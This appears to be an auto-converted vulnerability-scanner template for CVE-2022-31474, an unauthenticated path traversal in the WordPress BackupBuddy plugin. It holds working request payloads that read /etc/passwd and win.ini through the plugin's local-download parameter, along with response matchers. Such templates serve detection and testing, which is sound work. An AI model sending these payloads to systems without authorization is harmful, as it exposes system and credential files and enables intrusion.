id: yaml-poc-ithemes-backupbuddy-directory_traversal-CVE-2022-31474
info:
  name: Yaml Poc Ithemes Backupbuddy Directory_Traversal Cve 2022 31474
  author: converted
  severity: high
  description: 'Converted from xpoc: yaml-poc-ithemes-backupbuddy-directory_traversal-CVE-2022-31474'
  tags: traversal,cve
  classification:
    cve-id: CVE-2022-31474
  reference:
  - https://cxsecurity.com/issue/WLB-2022090019
  - https://ithemes.com/blog/wordpress-vulnerability-report-special-edition-september-6-2022-backupbuddy/
  - https://packetstormsecurity.com/files/168292/WordPress-BackupBuddy-8.7.4.1-Arbitrary-File-Read.html
  - https://patchstack.com/database/vulnerability/backupbuddy/wordpress-backup-buddy-plugin-8-5-8-0-8-7-4-1-unauthenticated-path-traversal-arbitrary-file-download-vulnerability?_s_id=cve
http:
- method: GET
  path:
  - /wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=update1&local-download=/etc/passwd
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - 'root:[x*]:0:0:'
- method: GET
  path:
  - /wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=update1&local-download=c:\\windows\\win.ini
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - for 16-bit app support
